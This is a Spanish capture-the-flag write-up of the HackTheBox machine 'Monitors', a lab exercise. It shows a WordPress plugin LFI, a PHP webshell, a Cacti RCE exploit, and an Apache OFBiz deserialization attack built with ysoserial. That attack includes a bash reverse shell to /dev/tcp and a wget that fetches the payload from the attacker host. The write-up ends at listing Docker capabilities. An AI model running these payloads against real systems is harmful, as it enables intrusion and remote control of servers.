---
title: "Monitors - HTB Writeup"
layout: single
excerpt: "Monitors es una máquina de dificultad difícil de la plataforma de HackTheBox. En esta máquina accedemos inicialmente mediante la explotación de software desactualizado. Para escalar privilegios, abusamos de una 'Deserializacion Insegura' y nos aprovechamos de una capability en un contenedor de docker para crear un modulo de kernel malicioso y ganar acceso al sistema como usuario root."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/136782753-9d450e38-a300-42ac-ba6a-11eec88dcfd9.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/67548295/191989683-8e498bfd-d8dd-4e45-b929-f557100f9648.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - WordPress
  - Insecure Deserialization
  - Docker
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/136782947-8232fd38-bba7-46a0-90bd-7c7f130bc25e.png)

# Enumeración

Comenzamos enviando una paquete [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} a la máquina con la herramienta `ping`, con esto veremos su estado y su **sistema operativo**:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ping -c 1 10.10.10.238
PING 10.10.10.238 (10.10.10.238) 56(84) bytes of data.
64 bytes from 10.10.10.238: icmp_seq=1 ttl=63 time=77.7 ms

--- 10.10.10.238 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 77.746/77.746/77.746/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el `TTL`, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Enumero los puertos de la máquina con ayuda de la herramienta `nmap` :

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.10.238 -sC -sV -oN targeted 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-11 12:45 WEST
Nmap scan report for 10.10.10.238
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html; charset=iso-8859-1).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.90 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Vemos que hay 2 puertos abiertos:

| Puerto | Servicio |
|:------:|:--------:|
| 22 | [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 80 | [HTTP](https://www.pickaweb.es/ayuda/que-es-http/){:target="\_blank"}{:rel="noopener nofollow"} |

# User.txt

Uso `whatweb` para enumerar un poco el puerto `80`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ whatweb http://10.10.10.238
 http://10.10.10.238 [403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@monitors.htb], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)]
 IP[10.10.10.238]
```

Vale, obtenemos un código de estado `403` y nos reporta un **email** donde el dominio utilizado es `monitors.htb`.

¿Se estará aplicando [Virtual Hosting](https://lular.es/internet/que-es-hosting-virtual/){:target="\_blank"}{:rel="noopener nofollow"}?

Pruebo a añadir el dominio al archivo `/etc/hosts/`:

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $ cat /etc/hosts
[...]

10.10.10.238  monitors.htb 

[...]
```

Bien, probemos ahora a acceder a la web mediante la **dirección IP**:

![image](https://user-images.githubusercontent.com/67548295/136789960-e2411238-7932-4fde-9953-6a2ed43a0941.png)

Al intentar acceder, el servidor nos dice que el acceso a la web mediante la dirección IP **no está permitido**.

Ya que hemos añadido el dominio que hemos encontrado al `/etc/hosts` probemos a acceder mediante este:

![image](https://user-images.githubusercontent.com/67548295/136790455-f309e842-dc01-402e-bcf5-04acf8e9c3ab.png)

¡Funciona!

Ahora que podemos acceder a la página, usemos de nuevo la herramienta `whatweb`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ whatweb http://monitors.htb
http://monitors.htb [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)],
IP[10.10.10.238], JQuery, MetaGenerator[WordPress 5.5.1], Script[text/javascript], Title[Welcome to Monitor &#8211; Taking hardware monitoring seriously],
UncommonHeaders[link], WordPress[5.5.1]
```

Y por lo que podemos ver, estamos tratando ante un `WordPress`.

Intento buscar vulnerabilidades de la versión de `WordPress` que `whatweb` nos ha reportado:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ searchsploit WordPress 5.5.1
--------------------------------------------------------------------------------------------------------------------------- ------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ------------------------------
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                        | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                  | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                | php/webapps/48918.sh
WordPress Plugin WatuPRO 5.5.1 - SQL Injection                                                                             | php/webapps/42291.txt
--------------------------------------------------------------------------------------------------------------------------- ------------------------------
```

Pero no encuentro nada.

Algo potencial a enumerar en `WordPress` son sus `plugins`, en mi caso voy a utilizar `WPscan` pero hay muchas maneras de enumerar esto:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ wpscan --url "http://monitors.htb" --enumerate p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://monitors.htb/ [10.10.10.238]
[+] Started: Mon Oct 11 13:50:27 2021

Interesting Finding(s):

[...]

[i] Plugin(s) Identified:

[+] wp-with-spritz
 | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt

[...]

```

La herramienta nos reporta un **plugin** que está siendo utilizado.

También nos identifica la versión, que es la `1.0`. 

Tras ver esto, pruebo a buscar **vulnerabilidades asociadas** a esta versión del plugin:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ searchsploit spritz 1.0
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                                                         | php/webapps/44544.php
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Al parecer hay una vulnerabilidad de **RFI** y por lo tanto **LFI** en este plugin.

Veamos en que consiste:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ cat 44544.php 
# Exploit Title: WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion
# Date: 2018-04-25
# Exploit Author: Wadeek
# Software Link: https://downloads.wordpress.org/plugin/wp-with-spritz.zip
# Software Version: 1.0
# Google Dork: intitle:("Spritz Login Success") AND inurl:("wp-with-spritz/wp.spritz.login.success.html")
# Tested on: Apache2 with PHP 7 on Linux
# Category: webapps


1. Version Disclosure

/wp-content/plugins/wp-with-spritz/readme.txt

2. Source Code

if(isset($_GET['url'])){
$content=file_get_contents($_GET['url']);

3. Proof of Concept

/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
```

Si vemos la parte del `PoC` nos daremos cuenta de como se produce el **LFI**.

Bien, sigamos el `Proof of Concept` para ejecutar el **LFI**:

![image](https://user-images.githubusercontent.com/67548295/136807447-ab94f50f-cde0-4934-8d48-98a3c9210fdf.png)

Tenemos capacidad para leer archivos de la máquina.

Ahora probemos el **RFI** creando un servidor en nuestra máquina que aloje una `webshell`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ cat zeroshell.php 
gif8;

<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; 
?>
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ authbind python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
![image](https://user-images.githubusercontent.com/67548295/136808071-3bcd6eb2-6c3a-45f0-989b-6a283c32a47a.png)

Tras probar el **RFI**, me doy cuenta de que **no se interpreta el codigo PHP**, así que me centro en el **LFI**.

Pienso en **archivos críticos** que podamos leer y uno que se me viene a la cabeza es el `wp-config.php` que **suele contener credenciales**.

Pero claro, no se en que ruta está, así que voy probando hasta que lo encuentro:

![image](https://user-images.githubusercontent.com/67548295/136811060-ed310710-589d-4020-bbe5-158cb1d8d93d.png)

Y como suponía, este archivo contenía **crendenciales en texto claro**.

Pruebo estas credenciales en el **panel de login** `wp-login.php`

![image](https://user-images.githubusercontent.com/67548295/136933873-151278ac-df7f-4f8e-b009-6ee7b4b46fa9.png)

Pero no consigo acceder.

Sigo enumerando archivos críticos desde el LFI y pruebo a intentar enumerar **dominios y subdominios** que también esten empleando `virtual hosting` en la máquina víctima.

Concretamente, esto se puede ver en el archivo `/etc/apache2/sites-enabled/000-default.conf`.

Probemos a ver si funciona:
```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ curl "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../../etc/apache2/sites-enabled/000-default.conf"
# Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf

[...]

```

Como vemos, ha funcionado y parece ser que hemos encontrado un subdominio con nombre `cacti-admin`.

Lo incorporo en el `/etc/hosts` y compruebo que existe:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ cat /etc/hosts
[...]

10.10.10.238  monitors.htb cacti-admin.monitors.htb 

[...]
```

![image](https://user-images.githubusercontent.com/67548295/136935799-dbeabed7-a35b-413e-a3ce-0589a54c656a.png)

Tras intentar ingresar al subdominio, vemos que si existe.

Pruebo **credenciales por defecto** en el panel de login, cosas como `admin:admin`, `admin:password`, `admin:pass`, pero no funciona ninguna.

Recuerdo la contraseña que habíamos encontrado en el archivo `wp-config.php` mediante el **LFI** y pruebo a utilizarla con el usuario `admin`:

![gif-login](https://user-images.githubusercontent.com/67548295/136937626-afee7802-4338-4b39-84cb-6e8e33b6aeeb.gif)

¡Accedemos!

Tras indagar un buen rato entre las funciones de este software en busca de vías potenciales para conseguir acceso a la máquina, veo que se nos lista la **versión** en la esquina superior:

![image](https://user-images.githubusercontent.com/67548295/136938293-8aac6f0d-fe77-4ba5-9e0d-9a8d8828ffdd.png)

Versión `1.2.12`, intento buscar vulnerabilidades asociadas a esta versión con ayuda de la herramienta `searchsploit`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ searchsploit cacti 1.2.12
--------------------------------------------------------------------------------------------------------------------------- ----------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ----------------------------
Cacti 1.2.12 - 'filter' SQL Injection / Remote Code Execution                                                              | php/webapps/49810.py
--------------------------------------------------------------------------------------------------------------------------- ----------------------------
Shellcodes: No Results
Papers: No Results
```
Y vemos que tenemos un exploit de **ejecución remota de comandos**.

Copio el exploit y lo ejecuto para ver lo que nos pide:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ python3 49810.py 
usage: 49810.py [-h] -t <target/host URL> -u <user> -p <password> --lhost <lhost> --lport <lport>
49810.py: error: the following arguments are required: -t, -u, -p, --lhost, --lport
```
Vale, nos pide la `url` de la víctima, usuario, contraseña, IP local y puerto, bien, proporcionemos estos datos, pero no si antes ponernos en escucha con `netcat`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ nc -lvnp 4444
Listening on 0.0.0.0 4444
```
Ahora ejecutemos el exploit:

![image](https://user-images.githubusercontent.com/67548295/136940583-1f3a9b67-8393-45ec-9184-a2d43ca1da7a.png)

¡Conseguimos acceso a la máquina!

Somos usuario `www-data` asi que habrá que seguir enumerando para convertirnos en otro usuario con un poco más de **privilegios**.

```bash
www-data@monitors:/home$ grep -E 1[0-9]{3}  /etc/passwd | sed s/:/\ / | awk '{print $1}'
marcus
```
En este caso, tenemos que buscar la forma de convertirnos en el usuario `marcus`.

---

Enumero el sistema hasta que encuentro que hay un **puerto interno en escucha** poco común:

```bash
www-data@monitors:/home$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     

[...]
```
Pero tras ver que no podemos conectarnos por **SSH** para hacer [port forwarding](https://culturacion.com/que-es-port-forwarding/){:target="\_blank"}{:rel="noopener nofollow"}, sigo enumerando.

Me acuerdo de que nuestro objetivo era `marcus`, asi procedí a enumerar archivos que fueran de su propiedad en busca de algo que fuese relevante:

```bash
www-data@monitors:/$ find / -user marcus 2>/dev/null | grep -v -E "proc|sys"
/run/user/1000
/home/marcus
/home/marcus/.backup
/home/marcus/.gnupg
/home/marcus/.bash_logout
/home/marcus/.profile
/home/marcus/.bashrc
/home/marcus/.cache
/dev/pts/1
```
Nada interesante.

Enumeremos ahora archivos que tengan en el nombre la palabra `marcus`:

```bash
www-data@monitors:/$ find / -iname \*marcus\* 2>/dev/null
/home/marcus
```

Nada, con el nombre no hemos encontrado nada.

Probemos a buscar archivos que tengan en el nombre la palabra `cacti`:

```bash
www-data@monitors:/$ find / -iname \*cacti\* 2>/dev/null
[...]

/etc/systemd/system/cacti-backup.service
/lib/systemd/system/cacti-backup.service

 [...]
```

¿Y esto? ¿`cacti-backup.service`? Inspeccionemos este archivo:

```bash
www-data@monitors:/$ cat /etc/systemd/system/cacti-backup.service
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
```

Este archivo nos revela una ruta en el directorio `home` de `marcus`, que aparentemente estaba oculta.

Veamos que contiene este archivo:

```bash
www-data@monitors:/$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```
Un archivo con **credenciales en texto claro**.

Tras observar que este archivo estaba en el **directorio personal** de `marcus`, pruebo a conectarme por **SSH** con el usuario `marcus` y la contraseña que he encontrado:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ssh marcus@10.10.10.238
marcus@10.10.10.238 password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 12 16:26:21 UTC 2021

  System load:  0.0                Users logged in:                1
  Usage of /:   35.1% of 17.59GB   IP address for ens160:          10.10.10.238
  Memory usage: 54%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-968a1c1855aa: 172.18.0.1
  Processes:    189

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

128 packages can be updated.
97 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Oct 12 16:26:21 2021 from 10.10.14.173
marcus@monitors:~$
```

¡Ha funcionado!, hemos conseguido acceder a la máquina como usuario `marcus`.

Una vez hayamos alcanzado este punto, podremos ver la flag `user.txt` en la ruta `/home/marcus/user.txt`:

```bash
marcus@monitors:~$ cat /home/marcus/user.txt 
1XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX4
```
# Root.txt

En el directorio `home` de `marcus` también había una nota:

```bash
marcus@monitors:~$ cat note.txt 
TODO:

Disable phpinfo	in php.ini		- DONE
Update docker image for production use	- 
```
Intento sacar la **máxima información** de la nota haciendo **suposiciones**:

* Es un archivo **TODO**, es decir, de cosas a hacer.
* Habla de una imagen de **docker**, ¿puede que haya contenedores en la máquina?
* Dice que tiene que actualizar la imagen para usarla en producción, ¿La imagen contendrá algo peligroso como para no ponerla en producción?

Después de hacer estas suposiciones, me acuerdo de que había un puerto interno abierto poco común.

Veamoslo de nuevo:

```bash
marcus@monitors:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     

[...]
```
Ahora que podemos conectarnos por **SSH**, probemos a hacer un [port forwarding](https://culturacion.com/que-es-port-forwarding/){:target="\_blank"}{:rel="noopener nofollow"} para poder tener **conectividad** a este puerto `8443` desde mi máquina y así poder trabajar más cómodamente.

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $ ssh marcus@10.10.10.238 -L 8443:127.0.0.1:8443
marcus@10.10.10.238 password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 12 16:45:55 UTC 2021

  System load:  0.08               Users logged in:                0
  Usage of /:   34.9% of 17.59GB   IP address for ens160:          10.10.10.238
  Memory usage: 39%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-968a1c1855aa: 172.18.0.1
  Processes:    178

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

128 packages can be updated.
97 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon Sep 27 10:03:41 2021 from 10.10.14.19
marcus@monitors:~$ 
```
Se supone que ya tenemos **conectividad** con el puerto `8443` de la máquina víctima en nuestra máquina, comprobemoslo:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $curl 127.0.0.1:8443
Bad Request
This combination of host and port requires TLS.
```
Parece que si está funcionando pero el servidor nos avisa de que se requiere del protocolo `HTTPS` o `TLS over HTTP`

Probemos, entonces, a hacer otra petición pero esta vez con `HTTPS`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -k -s https://127.0.0.1:8443 | html2text
****** HTTP Status 404 â Not Found ******
===============================================================================
Type Status Report
Message Not found
Description The origin server did not find a current representation for the
target resource or is not willing to disclose that one exists.
===============================================================================
**** Apache Tomcat/9.0.31 ****
```
Y ahora si funciona, pero como podemos ver, el servidor nos responde con un **código de estado** `404 Not Found`

Ya que estamos tramitando peticiones con el protocolo `HTTPS` pruebo a enumerar el **certificado SSL** de la web para obtener detalles:

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $ curl --insecure -s -v https://127.0.0.1:8443 2>&1 | grep "\*"
*   Trying 127.0.0.1:8443...
* Connected to 127.0.0.1 (127.0.0.1) port 8443 (#0)

[...]

*  subject: C=US; ST=DE; L=Wilmington; O=Apache Software Fundation; OU=Apache OFBiz; CN=ofbiz-vm.apache.org; emailAddress=dev@ofbiz.apache.org
*  start date: May 30 08:43:19 2014 GMT
*  expire date: May 27 08:43:19 2024 GMT
*  issuer: C=US; ST=DE; L=Wilmington; O=Apache Software Fundation; OU=Apache OFBiz; CN=ofbiz-vm.apache.org; emailAddress=dev@ofbiz.apache.org
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
> Accept: */*
* Mark bundle as not supporting multiuse
* Connection #0 to host 127.0.0.1 left intact
```

Vemos que se repite varias veces la palabra `OFbiz`.

Trato de ver los detalles del **certificado SSL** desde el navegador para más comodidad:

![image](https://user-images.githubusercontent.com/67548295/136999111-02693278-3387-4dda-bc6b-0db85b94cfbb.png)

Concluimos que se esta utilizando una versión o variante de [Apache](https://www.hostinger.es/tutoriales/que-es-apache/){:target="\_blank"}{:rel="noopener nofollow"} con nombre `Apache OFbiz`

Pruebo a `fuzzear` directorios y recursos para ver si encontramos algo, esto con ayuda de la herramienta `gobuster`:

```bash
┌─[✗]─[z3r0byte@z3r0byte]─[~]
└──╼ $wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://127.0.0.1:8443/FUZZ
 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://127.0.0.1:8443/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                
=====================================================================

000000002:   302        0 L      0 W        0 Ch        "images"               
000000061:   302        0 L      0 W        0 Ch        "content"              
000000138:   302        0 L      0 W        0 Ch        "common"               
000000228:   302        0 L      0 W        0 Ch        "catalog"              
000000550:   302        0 L      0 W        0 Ch        "marketing"            
000000765:   302        0 L      0 W        0 Ch        "ecommerce"            
000000906:   302        0 L      0 W        0 Ch        "ap"  
```
Vemos varios recursos con un **código de estado 3XX**, es decir, una **redirección**.

Accedamos a cualquiera de estos para ver a donde nos redirige, por ejemplo al directorio `ap`:

![image](https://user-images.githubusercontent.com/67548295/137030382-8b47dec7-eaad-4dd9-b5b9-bcbb2cceb699.png)

Parece un **panel de inicio de sesión**, pero si tenemos ojo, habremos visto algo más interesante:

![image](https://user-images.githubusercontent.com/67548295/137030617-b63dd007-21e4-4147-9299-a087863121b7.png)

Una **versión**, esto es muy valioso ya que ahora podremos buscar **vulnerabilidades asociadas**.

Busco vulnerabilidades de esta versión en `Internet`:

![image](https://user-images.githubusercontent.com/67548295/137033049-ed505df3-407e-4f6c-abdd-f044a0ecb87f.png)

Busco por el **identificador CVE** que hemos encontrado y encuentro un [repositorio de GitHub](https://github.com/g33xter/CVE-2020-9496){:target="\_blank"}{:rel="noopener nofollow"} donde muestran un `PoC` de esta vulnerabilidad:

Bien, sigamos los pasos y... ¡explotemos esto!

## 1º Paso · Crea una reverse shell en bash

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ cat rev.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.139/4444 0>&1
```

## 2º Paso · Monta un servidor en python3 para que la reverse shell sea visible via HTTP

```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ authbind python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

## 3º Paso · Descarga la herramienta YsoSerial, que sirve para explotar deserializaciones inseguras.

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ wget https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.ja

Longitud: 59524721 (57M) [application/java-archive]
Grabando a: «ysoserial-master-d367e379d9-1.jar»

ysoserial-master-d367 100%[=========================>]  56,77M  11,4MB/s    en 5,1s    

La cabecera de fecha de última modificación es inválida -- marca de tiempo descartada.
2021-10-12 22:56:13 (11,1 MB/s) - «ysoserial-master-d367e379d9-1.jar» guardado [59524721/59524721]
```

## 4º Paso · Genera un payload con YsoSerial y copia el output - recuerda cambiar la IP

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget 10.10.14.139/rev.sh -O /tmp/shell.sh" | base64 | tr -d "\n"
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZT [...]
```
(Esto genera una cadena de texto muy larga)

## 5º Paso · Tramita una petición con curl conteniendo nuestro payload

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">AQUI_PON_TU_PAYLOAD</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
```
## 6º Paso · Asegurate de que has recibido una petición en tu servidor de python3

```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $authbind python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.238 - - [12/Oct/2021 23:10:44] "GET /rev.sh HTTP/1.1" 200 -
```

Si no has recibido esta **petición en tu servidor de python**, vuelve a intentar tramitar la petición con `curl` o comprueba que has introducido el payload en el sitio correcto.

## 7º Paso · Ponte en escucha con netcat por el puerto que configuraste en la reverse shell

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $ nc -lvnp 4444
Listening on 0.0.0.0 4444
```
## 8º Paso · Crea otro payload par ejecutar la reverse shell que previamente cargamos en el sistema

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n"
rO0ABXNyABdqYXZhLnV0aWwuUHJpb [...]
```
## 9º Paso · Envía otra petición con curl para ejecutar nuestro payload

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">AQUI_PON_TU_PAYLOAD_PARA_EJECUTAR_LA_REVERSE_SHELL</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
```

## 10º Paso · Comprueba tu listener y disfruta de la reverse shell

```bash
┌─[✗]─[z3r0byte@z3r0byte]─[~]
└──╼ $ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.238 48950
bash: cannot set terminal process group (30): Inappropriate ioctl for device
bash: no job control in this shell
root@586273933ab3:/usr/src/apache-ofbiz-17.12.01#
```

---

¡Hemos ganado acceso al sistema!, y enumerando el sistema me encuentro con que estamos en un contenedor de `docker`:

```bash
root@586273933ab3:/# ls -a / | grep '^\.'
.
..
.dockerenv
```
Al ver esto, pienso que está claro que hay que **escapar de este contenedor**.

Tras investigar en una gran variedad de recursos sobre como escapar de un entorno de `docker`, encuentro un artículo interesante:

* [Docker guide](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout){:target="\_blank"}{:rel="noopener nofollow"}

Como vemos, tenemos varios métodos para escalar privilegios y escapar de un `docker`, pero tras probar unas cuantas maneras, llego a las `capabilities`.

* [Docker Capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#capabilities-in-docker-containers){:target="\_blank"}{:rel="noopener nofollow"}

Si nos fijamos, en el artículo aparece la manera de **listar las capabilities** de un contenedor de `docker`:

![image](https://user-images.githubusercontent.com/67548295/137583362-32be0255-546e-455a-b060-901b06a908c9.png)

Bien, ejecutemos este comando en el contenedor para ver que nos reporta:

```bash
root@1569c10115cc:/usr/src/apache-ofbiz-17.12.01# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
